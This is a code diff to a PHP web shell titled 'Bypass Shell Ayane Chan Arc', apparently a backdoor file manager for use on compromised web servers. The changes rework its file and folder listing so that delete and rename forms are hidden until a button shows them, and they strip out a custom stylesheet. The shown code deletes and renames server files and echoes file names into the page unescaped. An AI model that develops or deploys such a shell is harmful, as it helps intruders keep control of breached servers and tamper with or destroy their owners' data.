@@ -64,25 +64,29 @@ function display_path_links($dir) {
             $folderPath = htmlspecialchars($dir . '/' . $folder);
             echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
             echo "<a href='?dir=" . urlencode($folderPath) . "' class='btn btn-link'>$folder/</a>";
-            echo "<form method='post' style='display:inline;'>";
+            echo "<form method='post' class='d-inline' style='display:none;' id='delete-form-$folder'>";
             echo "<input type='hidden' name='path' value='" . htmlspecialchars($dir . '/' . $folder) . "'>";
-            echo "<button type='submit' name='delete' class='btn btn-danger btn-sm ml-2'>Delete</button>";
+            echo "<button type='submit' name='delete' class='btn btn-danger btn-sm'>Delete</button>";
             echo "</form>";
+            echo "<button class='btn btn-danger btn-sm' onclick='document.getElementById(\"delete-form-$folder\").style.display=\"inline\";'>Delete</button>";
             echo "</div>";
         }
 
         foreach ($files as $file) {
+            $filePath = htmlspecialchars($dir . '/' . $file);
             echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
             echo "<span>$file</span>";
-            echo "<form method='post' style='display:inline;'>";
+            echo "<form method='post' class='d-inline' style='display:none;' id='rename-form-$file'>";
             echo "<input type='hidden' name='source' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
-            echo "<input type='text' name='destination' class='form-control-sm' placeholder='New name'>";
+            echo "<input type='text' name='destination' class='form-control form-control-sm' placeholder='New name' required>";
             echo "<button type='submit' name='rename' class='btn btn-warning btn-sm ml-2'>Rename</button>";
             echo "</form>";
-            echo "<form method='post' style='display:inline;'>";
+            echo "<button class='btn btn-warning btn-sm' onclick='document.getElementById(\"rename-form-$file\").style.display=\"inline\";'>Rename</button>";
+            echo "<form method='post' class='d-inline' style='display:none;' id='delete-form-file-$file'>";
             echo "<input type='hidden' name='path' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
-            echo "<button type='submit' name='delete' class='btn btn-danger btn-sm ml-2'>Delete</button>";
+            echo "<button type='submit' name='delete' class='btn btn-danger btn-sm'>Delete</button>";
             echo "</form>";
+            echo "<button class='btn btn-danger btn-sm' onclick='document.getElementById(\"delete-form-file-$file\").style.display=\"inline\";'>Delete</button>";
             echo "</div>";
         }
     } else {
@@ -140,34 +144,6 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bypass Shell Ayane Chan Arc</title>
     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
-    <style>
-        body {
-            background-color: #f0f8ff;
-        }
-        .container {
-            background-color: #fff0f5;
-            border-radius: 8px;
-            padding: 20px;
-        }
-        .btn-link {
-            color: #ff69b4;
-        }
-        .btn-primary {
-            background-color: #87ceeb;
-            border-color: #87ceeb;
-        }
-        .btn-danger {
-            background-color: #ff4500;
-            border-color: #ff4500;
-        }
-        .btn-warning {
-            background-color: #ffd700;
-            border-color: #ffd700;
-        }
-        footer {
-            margin-top: 20px;
-        }
-    </style>
 </head>
 <body>
     <div class="container mt-5">
@@ -176,7 +152,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         <div class="text-center mb-4">
             <img src="https://i.pinimg.com/564x/b6/ac/db/b6acdba14a2632ae4bc67088ba0c0422.jpg" alt="Welcome Image" class="img-fluid">
         </div>
-        <form method="post" class="text-center">
+        <form method="post" class="text-center mb-4">
             <button type="submit" name="logout" class="btn btn-danger">Logout</button>
         </form>
 
@@ -219,7 +195,6 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         <!-- Login page content here if not authenticated -->
         <?php endif; ?>
     </div>
-
     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
         <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
